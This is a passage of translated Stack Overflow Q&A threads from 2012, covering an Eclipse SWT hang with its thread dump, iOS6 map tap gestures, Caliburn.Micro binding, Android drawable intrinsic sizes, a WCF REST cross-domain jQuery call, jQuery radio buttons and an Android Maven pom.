    at java.lang.Object.wait(Native Method)
    - waiting on <7d50c39d8> (a org.eclipse.jdt.internal.core.search.indexing.IndexManager)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.jdt.internal.core.search.processing.JobManager.run(JobManager.java:382)
    - locked <7d50c39d8> (a org.eclipse.jdt.internal.core.search.indexing.IndexManager)
    at java.lang.Thread.run(Thread.java:680)

"Worker-2" prio=5 tid=7fa89f49a000 nid=0x11641b000 in Object.wait() [11641a000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:188)
    - locked <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:220)
    at org.eclipse.core.internal.jobs.Worker.run(Worker.java:50)

"Worker-1" prio=5 tid=7fa89f3cc000 nid=0x114dcf000 in Object.wait() [114dce000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:188)
    - locked <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:220)
    at org.eclipse.core.internal.jobs.Worker.run(Worker.java:50)

"Worker-0" prio=5 tid=7fa89d0b0000 nid=0x116169000 in Object.wait() [116168000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:188)
    - locked <7d43e4648> (a org.eclipse.core.internal.jobs.WorkerPool)
    at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:220)
    at org.eclipse.core.internal.jobs.Worker.run(Worker.java:50)

"Worker-JM" prio=5 tid=7fa89e886000 nid=0x113f33000 in Object.wait() [113f32000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d4277db8> (a java.util.ArrayList)
    at org.eclipse.core.internal.jobs.InternalWorker.run(InternalWorker.java:58)
    - locked <7d4277db8> (a java.util.ArrayList)

"Bundle File Closer" daemon prio=5 tid=7fa89b33f000 nid=0x114baf000 in Object.wait() [114bae000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d447b468> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.getNextEvent(EventManager.java:400)
    - locked <7d447b468> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.run(EventManager.java:336)

"[Timer] - Main Queue Handler" daemon prio=5 tid=7fa89ec29800 nid=0x114ef4000 in Object.wait() [114ef3000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d42e9a50> (a java.lang.Object)
    at org.eclipse.equinox.internal.util.impl.tpt.timer.TimerImpl.run(TimerImpl.java:141)
    - locked <7d42e9a50> (a java.lang.Object)
    at java.lang.Thread.run(Thread.java:680)

"Framework Event Dispatcher" daemon prio=5 tid=7fa89b2f9800 nid=0x1141c6000 in Object.wait() [1141c5000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d43147f0> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.getNextEvent(EventManager.java:400)
    - locked <7d43147f0> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.run(EventManager.java:336)

"Start Level Event Dispatcher" daemon prio=5 tid=7fa89e90b800 nid=0x11464f000 in Object.wait() [11464e000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d4314870> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at java.lang.Object.wait(Object.java:485)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.getNextEvent(EventManager.java:400)
    - locked <7d4314870> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread)
    at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.run(EventManager.java:336)

"State Data Manager" daemon prio=5 tid=7fa89b15c000 nid=0x113ce4000 waiting on condition [113ce3000]
   java.lang.Thread.State: TIMED_WAITING (sleeping)
    at java.lang.Thread.sleep(Native Method)
    at org.eclipse.osgi.internal.baseadaptor.StateManager.run(StateManager.java:297)
    at java.lang.Thread.run(Thread.java:680)

"Framework Active Thread" prio=5 tid=7fa89b157800 nid=0x113be1000 in Object.wait() [113be0000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d4021de0> (a org.eclipse.osgi.framework.internal.core.Framework)
    at org.eclipse.osgi.framework.internal.core.Framework.run(Framework.java:1862)
    - locked <7d4021de0> (a org.eclipse.osgi.framework.internal.core.Framework)
    at java.lang.Thread.run(Thread.java:680)

"Poller SunPKCS11-Darwin" daemon prio=1 tid=7fa89c10c800 nid=0x112448000 waiting on condition [112447000]
   java.lang.Thread.State: TIMED_WAITING (sleeping)
    at java.lang.Thread.sleep(Native Method)
    at sun.security.pkcs11.SunPKCS11$TokenPoller.run(SunPKCS11.java:692)
    at java.lang.Thread.run(Thread.java:680)

"Thread-1" daemon prio=6 tid=7fa89c002800 nid=0x7fff734ca960 runnable [7fff68d24000]
   java.lang.Thread.State: RUNNABLE
    at org.eclipse.swt.internal.cocoa.OS.objc_msgSendSuper(Native Method)
    at org.eclipse.swt.widgets.Widget.callSuper(Widget.java:221)
    at org.eclipse.swt.widgets.Widget.mouseDownSuper(Widget.java:1093)
    at org.eclipse.swt.widgets.List.mouseDownSuper(List.java:765)
    at org.eclipse.swt.widgets.Widget.mouseDown(Widget.java:1085)
    at org.eclipse.swt.widgets.Control.mouseDown(Control.java:2538)
    at org.eclipse.swt.widgets.Display.windowProc(Display.java:5493)
    at org.eclipse.swt.internal.cocoa.OS.objc_msgSendSuper(Native Method)
    at org.eclipse.swt.widgets.Widget.callSuper(Widget.java:221)
    at org.eclipse.swt.widgets.Widget.windowSendEvent(Widget.java:2102)
    at org.eclipse.swt.widgets.Shell.windowSendEvent(Shell.java:2299)
    at org.eclipse.swt.widgets.Display.windowProc(Display.java:5557)
    at org.eclipse.swt.internal.cocoa.OS.objc_msgSendSuper(Native Method)
    at org.eclipse.swt.widgets.Display.applicationSendEvent(Display.java:5002)
    at org.eclipse.swt.widgets.Display.applicationProc(Display.java:5151)
    at org.eclipse.swt.internal.cocoa.OS.objc_msgSend(Native Method)
    at org.eclipse.swt.internal.cocoa.NSApplication.sendEvent(NSApplication.java:128)
    at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3616)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine$9.run(PartRenderingEngine.java:1029)
    at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
    at org.eclipse.e4.ui.internal.workbench.swt.PartRenderingEngine.run(PartRenderingEngine.java:923)
    at org.eclipse.e4.ui.internal.workbench.E4Workbench.createAndRunUI(E4Workbench.java:86)
    at org.eclipse.ui.internal.Workbench$5.run(Workbench.java:588)
    at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
    at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:543)
    at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
    at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:124)
    at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:353)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:180)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:629)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:584)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1438)
    at org.eclipse.equinox.launcher.Main.main(Main.java:1414)

"Low Memory Detector" daemon prio=5 tid=7fa89e80b000 nid=0x111ed4000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"C2 CompilerThread1" daemon prio=9 tid=7fa89e80a800 nid=0x111dd1000 waiting on condition [00000000]
   java.lang.Thread.State: RUNNABLE

"C2 CompilerThread0" daemon prio=9 tid=7fa89e809800 nid=0x111cce000 waiting on condition [00000000]
   java.lang.Thread.State: RUNNABLE

"JDWP Command Reader" daemon prio=5 tid=7fa89b0c9000 nid=0x111bcb000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"JDWP Event Helper Thread" daemon prio=5 tid=7fa89b0c7000 nid=0x111ac8000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"JDWP Transport Listener: dt_socket" daemon prio=5 tid=7fa89b0c8000 nid=0x1119c5000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"Signal Dispatcher" daemon prio=9 tid=7fa89b0c5800 nid=0x1118bc000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"Surrogate Locker Thread (Concurrent GC)" daemon prio=5 tid=7fa89b0c4800 nid=0x1117b9000 waiting on condition [00000000]
   java.lang.Thread.State: RUNNABLE

"Finalizer" daemon prio=8 tid=7fa89d041800 nid=0x1114f5000 in Object.wait() [1114f4000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d4024710> (a java.lang.ref.ReferenceQueue$Lock)
    at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:118)
    - locked <7d4024710> (a java.lang.ref.ReferenceQueue$Lock)
    at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:134)
    at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)

"Reference Handler" daemon prio=10 tid=7fa89d041000 nid=0x1113f2000 in Object.wait() [1113f1000]
   java.lang.Thread.State: WAITING (on object monitor)
    at java.lang.Object.wait(Native Method)
    - waiting on <7d4020878> (a java.lang.ref.Reference$Lock)
    at java.lang.Object.wait(Object.java:485)
    at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116)
    - locked <7d4020878> (a java.lang.ref.Reference$Lock)

"main" prio=5 tid=7fa89b001000 nid=0x1099f9000 runnable [00000000]
   java.lang.Thread.State: RUNNABLE

"VM Thread" prio=9 tid=7fa89d03c000 nid=0x1112ef000 runnable 

"Gang worker#0 (Parallel GC Threads)" prio=9 tid=7fa89b002800 nid=0x10cd72000 runnable 

"Gang worker#1 (Parallel GC Threads)" prio=9 tid=7fa89b003000 nid=0x10ce75000 runnable 

"Gang worker#2 (Parallel GC Threads)" prio=9 tid=7fa89b003800 nid=0x10cf78000 runnable 

"Gang worker#3 (Parallel GC Threads)" prio=9 tid=7fa89b004000 nid=0x10d07b000 runnable 

"Concurrent Mark-Sweep GC Thread" prio=9 tid=7fa89b07f800 nid=0x110f90000 runnable 
"VM Periodic Task Thread" prio=10 tid=7fa89e81d000 nid=0x111fd7000 waiting on condition 

"Exception Catcher Thread" prio=10 tid=7fa89b001800 nid=0x109b99000 runnable 
JNI global references: 11239 
```

有没有人知道发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T09:02:51.453

经过调查，我终于找到了根本原因。它不是由 Tab 引起的，而是由 List 引起的。单击列表上的空白区域时（列表的行数多于条目数）， list.getSelection() 在 Windows 上仍将是当前选定的项目，但在 Mac 上将为空。并且当通过 list.getSelection()[0] 检索值时，eclipse 将挂起而不是抛出 ArrayIndexOutOfBoundsException()。我通过使用局部变量记住当前选择并在用户单击空白区域时设置选择来解决此问题。

# xcode - TapGestureRecognizer 在 IOS6 地图中不工作

> ID：13756908
> 
> 赞同：0
> 
> 时间：2012-12-07T04:25:58.517
> 
> 标签：xcode, ios6, maps, uitapgesturerecognizer

所以无论如何，像往常一样，我的应用程序在 iOS5 中运行得非常棒。

然后是带有新地图应用程序的 iOS6，它不再按预期运行。（在此处插入 Roll Eyes 图标）

我有一个具有以下用户交互的 MapView：

1.  用户可以通过捏合来放大/缩小。
2.  用户可以双击以放置图钉。

iOS6不再是这种情况，No.2不再起作用。似乎新的 MapView 不再直接检测双击。如果我禁用缩放（在 IB 中），那么它可以工作。

那么，我怎样才能使这项工作？还是将操作从“双击”更改为“长按”更好？

任何建议或如何在启用缩放的同时使其工作表示赞赏。

谢谢你们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T20:30:16.713

有没有搞错。

没有人回答这个问题，所以我要自己回答。我所做的是一个简单的 hack。

1.  在同一个视图控制器中实现 touchesBegan 委托。
2.  在那里，检测单点触摸，如果检测到单点触摸，则禁用 MapkitView 缩放。因此，为 MapKitView 实现的 TapGestureRecognizer 将响应。在这种情况下，双击将响应我需要的响应。
3.  当检测到 2 次触摸（屏幕上的两个手指）时，启用 MapkitView 的缩放。

这工作得很好。

希望这可以帮助其他面临与 iOS6 地图应用程序相同问题的人。令人惊讶的是，这仍然适用于谷歌地图（iOS6 之前）。

谢谢。

# c# - 您可以使用 Caliburn.Micro (WinRT) 绑定到 ImageBrush 的 ImageSource 属性吗？

> ID：13756909
> 
> 赞同：0
> 
> 时间：2012-12-07T04:25:59.173
> 
> 标签：c#, xaml, windows-runtime, caliburn.micro

我希望在 Caliburn.Micro 中使用动态背景图像。这是我尝试过的，但没有成功。

```
<Grid>
 <Grid.Background>
   <ImageBrush x:Name="MyPhoto" /> 
 </Grid.Background>
</Grid>

//some view model
public class ImageViewModel
{
   public ImageSource MyPhoto {get;set;}
}

//Add Convention
//App.XAML.cs
...
public override void Configure()
{
  ...

        ConventionManager.AddElementConvention<ImageBrush>(ImageBrush.ImageSourceProperty, "ImageSource", "Loaded");
  ...
} 
```

是否可以将 ImageBrush 的 ImageSource 与 Caliburn.Micro 绑定，或者有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T06:21:14.677

不确定，但我认为`AddElementConvention`仅适用于`UIElement`s 而不是`DependencyObject`s。不过，这应该可行：

`MainPage.xaml`：

```
<Grid x:Name="MyBrush">
</Grid> 
```

`MainPageViewModel.cs`：

```
public class MainPageViewModel : Screen
{
    public MainPageViewModel()
    {
        MyPhoto = new BitmapImage(new Uri("ms-appx:///Assets/SplashScreen.png"));
    }

    public ImageSource MyPhoto { get; set; }

    public ImageBrush MyBrush
    {
        get
        {
            ImageBrush brush = new ImageBrush();
            brush.ImageSource = MyPhoto;
            return brush;
        }
    }
} 
```

`App.xaml.cs`：

```
protected override void Configure()
{
    container = new WinRTContainer();
    container.RegisterWinRTServices();

    ConventionManager.AddElementConvention<Grid>(Grid.BackgroundProperty, "Background", "Loaded");
} 
```

或者，您可以在 XAML 中手动进行绑定：

```
<Grid>
    <Grid.Background>
        <ImageBrush ImageSource="{Binding MyPhoto}" /> 
    </Grid.Background>
</Grid> 
```

# android - android getIntrinsicHeight 和 getIntrinsicWidth 是什么意思？

> ID：13756910
> 
> 赞同：69
> 
> 时间：2012-12-07T04:26:07.753
> 
> 标签：android, drawable

嗨，我对 Android Drawable 类的两种方法感到困惑

```
getIntrinsicHeight()
getIntrinsicWidth() 
```

api定义说 [http://developer.android.com/reference/android/graphics/drawable/Drawable.html#getIntrinsicHeight()](http://developer.android.com/reference/android/graphics/drawable/Drawable.html#getIntrinsicHeight())

内在高度/宽度这个词是什么意思？我的意思是它是实际图像的宽度吗？

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2012-12-07T05:27:34.993

如果你想知道**intrinsic**的含义，它只不过是一个对象所拥有的实际属性。在我们的例子`getIntrinsicWidth/Height`中，只是意味着为您提供该可绘制对象的默认宽度/高度。

这将返回您放入资源文件夹中的可绘制对象的确切大小，而无需进行任何修改。

现在您必须知道`getWidth`或`getHeight`将返回一个值，该值可能会根据您`ImageView`在 XML 布局中为您指定的宽度和高度而变化。

假设您在 XML 布局中提供了`ImageView`as的宽度和高度，`100*100` 并且用作背景的可绘制对象的大小为 200*200。

现在`getIntrinsicWidth`必须返回 200 而`getWidth`必须返回 100。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2015-01-26T21:35:28.380

[stackoverflow 上的](https://stackoverflow.com/questions/6536418/android-why-are-the-width-height-of-the-drawable-in-imageview-wrong)相关问题。

如果您的图像是从互联网上下载的，`.getIntrinsicWidth()`并且`.getIntrinsicHeight()`确实分别为您提供了图像的“真实”宽度和高度。

它被称为内在，因为它只依赖于图像而不依赖于其他任何东西（比如你的手机）。

唉，你得到的并不是在所有情况下都是固有的——不幸的是，它确实取决于图像以外的东西。

这是您得到错误（即非内在）结果的地方。假设您使用的是默认启动器图标，那么

```
Log.i("", "ic_launcher intrinsic width " + getResources().getDrawable(R.drawable.ic_launcher).getIntrinsicWidth()); 
```

将告诉您启动器图标的宽度（以像素为单位）。但是哪一个呢？- 你有几个，一个在drawable-xhdpi文件夹，一个在drawable-hdpi文件夹，等等。好吧，如果你的设备是xhdpi，它会给你96，这确实是版本的像素宽度位于 drawable-xhdpi 文件夹中的启动器图标。现在，删除 drawable-xhdpi 文件夹中的图标，然后再次运行（仍然使用 xhdpi 设备（真实或模拟））。将使用的图像将来自 drawable-hdpi 文件夹，因为它与 xhdpi 版本“最接近”。该图标的像素宽度为 72。但上面的代码仍然会给你 96！

这显然不是“内在的”（在这个词的正确意义上），因为它不仅仅取决于所使用的图像。

因此，如果您像我一样懒惰，因此没有为每个资源图标/图像生成 4 个版本（而是仅使用 1 或 2 个版本，并手动缩放它们），您必须小心提到的 androidal 用词不当。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-05-14T00:09:11.930

在 android 中，drawable 可以有多种类型，例如颜色、位图、形状等。

其中一些可绘制对象具有固有高度，例如作为图像尺寸的 BitmapDrawable。

诸如 ColorDrawable（仅用于绘制纯色）之类的 Drawable 没有固有高度。在这种情况下，getIntrinsicHeight/Width 的值返回 -1。

即使drawable没有内在的高度/宽度，每个drawable都需要设置它们的边界才能渲染自己（即在你调用mydrawable.draw（canvas）之前）

如果您使用可绘制对象作为视图的背景，则视图会在内部为您设置边界。但是如果您在自己的 onDraw 中使用可绘制对象，则需要通过 setBounds 显式设置边界。

# wcf - 使用 JQuery Ajax 调用 WCF REST 服务不起作用

> ID：13756911
> 
> 赞同：0
> 
> 时间：2012-12-07T04:26:25.683
> 
> 标签：wcf

我正在学习 WCF 服务。我正在尝试从 Jquery 调用 RESTful 服务。我的服务如下

服务等级

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;
using System.ServiceModel.Activation;

namespace RESTfulServiceLib
{
[AspNetCompatibilityRequirements(RequirementsMode
    = AspNetCompatibilityRequirementsMode.Allowed)]
public class RestFullService : IRestFullService
{
    public string Welcome(string Name)
    {
        return  "Welcome to Restful Service " + Name;
    }
}
} 
```

界面

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.ServiceModel.Web;
using System.Text;
using System.ServiceModel.Activation;

namespace RESTfulServiceLib
{

[ServiceContract]

public interface IRestFullService
{
    [OperationContract]
    [WebInvoke(UriTemplate="/Welcome/{Name}",Method="GET",ResponseFormat=WebMessageFormat.Json)]
    string Welcome(string Name);
}
} 
```

我创建了一个服务主机，svc 文件是这样的

```
<%@ ServiceHost Language="C#" Debug="true" Service="RESTfulServiceLib.RestFullService" Factory="System.ServiceModel.Activation.WebServiceHostFactory" %> 
```

我有以下配置设置

```
<configuration>

<system.web>
    <compilation debug="true" targetFramework="4.0" />
</system.web>

<system.serviceModel>
    <behaviors>
        <endpointBehaviors>
            <behavior name="EndPBhvr">
                <webHttp helpEnabled="true" defaultOutgoingResponseFormat="Json"
                    faultExceptionEnabled="true" />

            </behavior>
        </endpointBehaviors>
        <serviceBehaviors>
            <behavior name="SvcBhvr">
                <serviceMetadata httpGetEnabled="true" />
            </behavior>
        </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment aspNetCompatibilityEnabled="true" />
    <services>
        <service name="RESTfulServiceLib.RestFullService">
            <endpoint address="" behaviorConfiguration="EndPBhvr"
                binding="webHttpBinding" bindingConfiguration="" name="EP1"
                contract="RESTfulServiceLib.IRestFullService" />
        </service>
    </services>
</system.serviceModel>
</configuration> 
```

运行应用程序后，当我浏览网址“http://localhost:2319/RESTFullService.svc/welcome/Mahesh”时，它返回的值为

```
"Welcome to Restful Service Mahesh" 
```

我曾尝试使用 Jquery 调用此服务。但我越来越

```
error 200 undefined 
```

脚本如下

```
<!DOCTYPE html>
<html>
<head>
<script src="jquery-1.6.4.min.js"></script>
<script >
function ajaxcall()
{
    $.ajax({
        url: "http://localhost:2319/RESTFullService.svc/welcome/mahesh",
        type: "GET",
        contentType: "application/json; charset=utf-8",
        dataType:"jsonp",
        data:{},
        processdata : true,
        success: function(response)
        {
            var data= response.d;
            alert(data);
        },

        error: function(e)
        {
            alert('error '+e.status + ' ' + e.responseText);
        }
    });
}
$().ready(function(){
    $('#btntest').click(ajaxcall);
})  
</script>
</head>
<body>
<button id="btntest" >Click Me</button>
</body>
</html> 
```

我的编码有什么问题？请帮我...

谢谢

马赫什

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T05:41:35.833

在您使用的 jQuery 的成功中

```
// var data= response.d; 
```

但您没有返回有效的 json。您的回复中没有“d”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:14:26.900

这是由于跨域问题。我在配置文件中做了一些更改，效果很好

修改后的配置文件。添加了带有 crossDomainScriptAccessEnabled="true" 的新绑定配置并添加到端点。并把 aspNetCompatibilityEnabled="false"

```
<configuration>

<system.web>
    <compilation debug="true" targetFramework="4.0" />
</system.web>

<system.serviceModel>
    <standardEndpoints />
    <bindings>
        <webHttpBinding>
            <binding name="Bind1" crossDomainScriptAccessEnabled="true" />
        </webHttpBinding>
    </bindings>
    <behaviors>
        <endpointBehaviors>
            <behavior name="EndPBhvr">
                <webHttp helpEnabled="true" defaultOutgoingResponseFormat="Json"
                    faultExceptionEnabled="true" />
            </behavior>
        </endpointBehaviors>
        <serviceBehaviors>
            <behavior name="SvcBhvr">
                <serviceMetadata httpGetEnabled="false" />
            </behavior>
        </serviceBehaviors>
    </behaviors>
       <serviceHostingEnvironment aspNetCompatibilityEnabled="false" />
    <services>
        <service behaviorConfiguration="SvcBhvr" name="RESTfulServiceLib.RestFullService">
            <endpoint address="" behaviorConfiguration="EndPBhvr" binding="webHttpBinding"
                bindingConfiguration="Bind1" name="EP1" contract="RESTfulServiceLib.IRestFullService" />
        </service>
    </services>
</system.serviceModel>
</configuration> 
```

修改后的脚本，我添加了“?callback=?” 在 URL 的末尾以 JSON 格式而不是 JSONP 格式获取输出。JSONP 无需在 URL 中提供回调即可工作

```
<!DOCTYPE html>
<html>
<head>
<script src="jquery-1.6.4.min.js"></script>
<script type="text/javascript" language="javascript">
    function ajaxcall()
    {
        $.ajax({
            url: "http://localhost:2319/RESTFullService.svc/welcome/mahesh?calback=?",
            type: "GET",
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            data: {},
            processdata: true,
            success: function (response) {
                var data = response;
                alert(data);
            },

            error: function (e) {
                alert('error ' + e.status + ' ' + e.responseText);

            }
            });
    }

    $().ready(function(){
        $('#btntest').click(ajaxcall);
    })  
</script>
</head>
<body>
    <button id="btntest" >Click Me</button>
</body>
</html> 
```

感谢我在 Calsoft Labs 的同事 Mrs.Poorani 帮助我解决了这个问题

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-06T07:31:00.820

```
function CallService(sucessData) {
$.ajax({
    // Add code for Cross Domain
    headers: getHeaders(),
    type: varType, //GET or POST or PUT or DELETE verb
    url: varUrl, // Location of the service
    data: varData, //Data sent to server
    contentType: varContentType, // content type sent to server
    dataType: varDataType, //Expected data format from server
    processdata: varProcessData, //True or False
    crossDomain: true,
    cache: varCache,
    timeout: 200000,
    success: sucessData,
    error: function (xhr) {// When Service call fails
        fancyAlert("Error: " + xhr.responseText);
        //fancyAlert('Error occured in Service Call');
    }
});
} 
```

# jquery - jQueryUI 的单选按钮集替代品？

> ID：13756912
> 
> 赞同：1
> 
> 时间：2012-12-07T04:26:38.107
> 
> 标签：jquery, user-interface, radio-button

我正在寻找一个 jQuery 单选按钮替换脚本或代码片段，其行为类似于 jQuery UI 的按钮集，转换`<input type="radio" value="1">`为按钮。我想保持单选按钮完好无损以实现样式灵活性，并且因为它是更好的编码实践。

使用 jQuery UI 看起来和工作正常，但是它**增加了 230 KB**的页面加载，如果可能的话我想避免。这是它现在的样子......

![在此处输入图像描述](../Images/b2d13a0e343298488fdacc08a3c34944.png)

任何人都见过可以使单选按钮出现如上的东西，但**不使用 jQuery UI**吗？

如果没有，任何人都可以提出一种方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-25T19:57:46.173

有趣的是，我只是在看另一个编写自己的模块来做同样事情的人：

免责声明：我没有对它做出贡献或对其进行彻底评估，因此请使用您的判断：

[http://jquerymore.com/form-elements/jQuery-Plugin-To-Convert-Radio-Buttons-Into-Grouped-Buttons-radiosforbuttons](http://jquerymore.com/form-elements/jQuery-Plugin-To-Convert-Radio-Buttons-Into-Grouped-Buttons-radiosforbuttons)

Alt 链接：[http ://www.jqueryscript.net/form/jQuery-Plugin-To-Convert-Radio-Buttons-Into-Grouped-Buttons-radios-for-buttons.html](http://www.jqueryscript.net/form/jQuery-Plugin-To-Convert-Radio-Buttons-Into-Grouped-Buttons-radios-for-buttons.html)

**它使用 JQuery 和 Bootstrap Css，**因此可能不符合您的轻量级标准。如果您已经包含 Jquery，那么这可能是一个选项。

[咆哮]

> 这个答案帮助了原作者，他接受了。在最初的 github 项目的人关闭它之前，它帮助了很多。然后不知何故，我被否决了 0。我几乎很抱歉帮助了某人。快速谷歌搜索“radiosforbuttons”（项目名称）会引导您找到具有相同内容的替代页面，顺便说一句，欢迎您编辑答案以提供更新的链接。但是不，一群懒惰的吃力不讨好的人宁愿投反对票也不愿提供帮助。这个地方每天都在腐烂。

[/咆哮结束]

# android - android maven mojo异常

> ID：13756916
> 
> 赞同：1
> 
> 时间：2012-12-07T04:27:17.053
> 
> 标签：android, maven

```
I'm new to Android maven integration in to sonar dashboard. My aim is thru Android JUnit to get the code coverage using Emma and integrate that into sonar dashboard. 
```

我在这样做时遇到了困难，并且遇到了以下异常。使用以下命令运行开发项目时

mvn clean install -Pemma

```
Please find the maven details below,

Apache Maven 3.0.4 (r1232337; 2012-01-17 14:14:56+0530)
Maven home: G:\Projects\apache-maven-3.0.4-bin\apache-maven-3.0.4\bin\..
Java version: 1.6.0, vendor: Sun Microsystems Inc.
Java home: C:\Program Files\Java\jdk1.6.0\jre
Default locale: en_US, platform encoding: Cp1252
OS name: "windows vista", version: "6.1", arch: "x86", family: "windows" 
```

http://maven.apache.org/maven-v4_0_0.xsd">4.0.0

```
<parent>
    <groupId>andersen.project</groupId>
    <artifactId>Hello-parent</artifactId>
    <version>1.0</version>
</parent>

<groupId>andersen.project</groupId>
<artifactId>MyProject</artifactId>
<packaging>apk</packaging>
<version>1.0</version>

<name>MyProject- Application</name>

<dependencies>

    <dependency>
        <groupId>com.google.android</groupId>
        <artifactId>android</artifactId>
        <version>4.0</version>
        <scope>system</scope>

        <systemPath>E:\android_sdk\add-ons\addon-google_apis-google_inc_-14\libs\maps.jar</systemPath>
    </dependency>
    <dependency>
        <groupId>android</groupId>
        <artifactId>android</artifactId>
        <systemPath>E:\android_sdk\platforms\android-14\android.jar</systemPath>
        <version>4.0</version>
        <scope>system</scope>
    </dependency>

    <dependency>
        <groupId>deps</groupId>
        <artifactId>dep1</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/libs/acra-4.2.3.jar</systemPath>
    </dependency>
    <dependency>
        <groupId>deps</groupId>
        <artifactId>dep2</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/libs/GoogleAdMobAdsSdk-6.1.0.jar</systemPath>
    </dependency>
    <dependency>
        <groupId>deps</groupId>
        <artifactId>dep3</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/libs/GSAndroidSDK.jar</systemPath>
    </dependency>
    <dependency>
        <groupId>deps</groupId>
        <artifactId>dep4</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/libs/GSAndroidSDK_src.jar</systemPath>
    </dependency>
    <dependency>
        <groupId>deps</groupId>
        <artifactId>dep5</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/libs/MMBrandedSDK.jar</systemPath>
    </dependency>

    <dependency>
